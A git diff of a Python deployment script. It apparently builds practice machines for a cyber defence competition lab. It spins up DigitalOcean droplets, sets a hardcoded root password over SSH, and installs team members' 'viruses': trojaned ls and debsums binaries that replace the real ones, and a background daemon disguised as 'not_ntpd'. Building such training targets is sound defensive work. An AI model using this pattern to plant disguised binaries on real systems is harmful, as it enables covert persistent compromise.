@@ -5,11 +5,12 @@ import paramiko
 from scp import SCPClient
 import config
 from os import system
+from typing import Tuple
 
 # Build David's
-system("cd david; cargo build --release --all; cd ..")
+system("cd david; cargo build --all; cd ..")
 
-count = 1
+count = 2
 
 manager = digitalocean.Manager(token=config.token)
 keys = manager.get_all_sshkeys()
@@ -32,68 +33,94 @@ for i in range(count):
 
 time.sleep(60)
 
+def initDroplet(tuple):
+    idx = tuple[0]
+    ip = tuple[1]
+
+    def waitUntilCompletion(a: Tuple) -> None:
+        print(a[1].readlines())
+        print(a[2].readlines())
+
+
+    k = paramiko.RSAKey.from_private_key_file("/home/david/.ssh/id_rsa")
+    c = paramiko.SSHClient()
+    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    c.connect(hostname=ip, username="root", pkey=k)
+    scp = SCPClient(c.get_transport())
+    waitUntilCompletion(c.exec_command("echo root:nuccdcpracticelab2017 | chpasswd"))
+
+    # general setup
+    c.exec_command("hostname %s" % str(idx))
+    waitUntilCompletion(c.exec_command("DEBIAN_FRONTEND=noninteractive apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y debsums curl build-essential make python-pip"))
+
+    # Isaac's virus 1
+    waitUntilCompletion(c.exec_command("pip install pyinstaller setproctitle requests"))
+
+    time.sleep(5)
+
+    # David's virus 2
+    c.exec_command("mv /bin/ls /realLS")
+    scp.put('david/target/debug/virus', '/var/virus')
+    scp.put('david/target/debug/virus', '/virus')
+    scp.put('david/target/debug/virus', '/var/virus')
+    c.exec_command("mv /usr/bin/debsums /realDebsums")
+    scp.put('david/target/debug/debsums', '/usr/bin/debsums')
+    scp.put('david/target/debug/ls', '/bin/ls')
+    scp.put('david/target/debug/ls', '/usr/bin/ls')
+    scp.put('david/target/debug/ls', '/sbin/ls')
+    scp.put('david/target/debug/ls', '/usr/sbin/ls')
+    waitUntilCompletion(c.exec_command("echo %s > /virusNum" % str(idx)))
+
+    # Alex's virus 2
+    scp.put("alex/GLaDOS/", "/root/glados/", recursive=True)
+    waitUntilCompletion(c.exec_command("cd /root/glados/; make; make install"))
+    # c.exec_command("rm -rf /root/glados") TODO
+
+    # Isaac's virus 2
+    scp.put('isaac/', '/root/isaac/', recursive=True)
+    time.sleep(1)
+    waitUntilCompletion(c.exec_command('cd /root/isaac; /root/isaac/build.sh'))
+    waitUntilCompletion(c.exec_command('cp /root/isaac/not_ntpd /usr/bin/not_ntpd'))
+    c.exec_command('nohup /usr/bin/not_ntpd %s &' % str(idx))
+    # c.exec_command("rm -rf /root/isaac") TODO
+
+    # Michael's virus 2
+    scp.put('michael/', '/root/michael/', recursive=True)
+    waitUntilCompletion(c.exec_command('cd /root/michael; chmod +x build.sh; ./build.sh'))
+    c.exec_command('nohup cat /virusNum &')
+    # c.exec_command("rm -rf /root/michael") TODO
+
+    # Victor's virus 2
+    scp.put('victor/', '/root/victor/', recursive=True)
+    waitUntilCompletion(c.exec_command('cd /root/victor; chmod +x build.sh; ./build.sh'))
+    # TODO
+
+    print('Done with %s' % idx)
+
+tuples = []
 for idx, droplet in enumerate(droplets):
     print('Starting droplet...')
     droplet.load()
     print(droplet.ip_address)
     with open('servers.csv', 'a+') as f:
         f.write("%s,%s\n" % (idx, droplet.ip_address))
-
-    k = paramiko.RSAKey.from_private_key_file("/home/david/.ssh/id_rsa")
-    c = paramiko.SSHClient()
-    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    c.connect(hostname=droplet.ip_address, username="root", pkey=k)
-    i, o, e = c.exec_command("echo root:nuccdcpracticelab2017 | chpasswd")
-
-    # general setup
-    c.exec_command("hostname %s" % str(idx))
-    i, o, e = c.exec_command("DEBIAN_FRONTEND=noninteractive apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y debsums curl build-essential make python-pip")
-    print(o.readlines())
-    print(e.readlines())
-
-    # Isaac's virus 1
-    c.exec_command("pip install pyinstaller setproctitle requests")
+    tuples.append((idx, droplet.ip_address))
 
 time.sleep(5)
 
-for idx, droplet in enumerate(droplets):
-    droplet.load()
-    k = paramiko.RSAKey.from_private_key_file("/home/david/.ssh/id_rsa")
-    c = paramiko.SSHClient()
-    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    c.connect(hostname=droplet.ip_address, username="root", pkey=k)
-    scp = SCPClient(c.get_transport())
+print('Started!')
 
-    # David's virus 2
-    c.exec_command("mv /bin/ls /realLS")
-    scp.put('david/target/release/virus', '/var/virus')
-    scp.put('david/target/release/virus', '/virus')
-    scp.put('david/target/release/virus', '/var/virus')
-    c.exec_command("mv /usr/bin/debsums /realDebsums")
-    scp.put('david/target/release/debsums', '/usr/bin/debsums')
-    scp.put('david/target/release/ls', '/bin/ls')
-    scp.put('david/target/release/ls', '/usr/bin/ls')
-    scp.put('david/target/release/ls', '/sbin/ls')
-    scp.put('david/target/release/ls', '/usr/sbin/ls')
-    c.exec_command("echo %s > /virusNum" % str(idx))
-    c.exec_command("nohup /virus &")
+from multiprocessing import Pool
 
-    # Alex's virus 2
-    c.exec_command("mkdir /root/glados")
-    c.exec_command("mkdir /root/glados/song")
-    scp.put("alex/GLaDOS/Makefile", "/root/glados/Makefile")
-    scp.put("alex/GLaDOS/GLaDOS.c", "/root/glados/GLaDOS.c")
-    scp.put("alex/GLaDOS/song/makefile", "/root/glados/song/makefile")
-    scp.put("alex/GLaDOS/song/song.c", "/root/glados/song/song.c")
-    c.exec_command("cd /root/glados/; make; make install")
-    # c.exec_command("rm -rf /root/glados") TODO
-
-    # Isaac's virus 2
-    scp.put('isaac/', '/root/isaac/', recursive=True)
-    i, o, e = c.exec_command('/root/isaac/build.sh')
-    o.readlines()
-    e.readlines()
-    c.exec_command('cp /root/isaac/not_ntpd /usr/bin/not_ntpd')
-    c.exec_command('/usr/bin/not_ntpd')
+try:
+    p = Pool(30)
+    p.map(initDroplet, tuples)
+finally:
+    for idx, ip in tuples:
+        k = paramiko.RSAKey.from_private_key_file("/home/david/.ssh/id_rsa")
+        c = paramiko.SSHClient()
+        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        c.connect(hostname=ip, username="root", pkey=k)
+        c.exec_command("nohup ls / &")
 
 time.sleep(20)
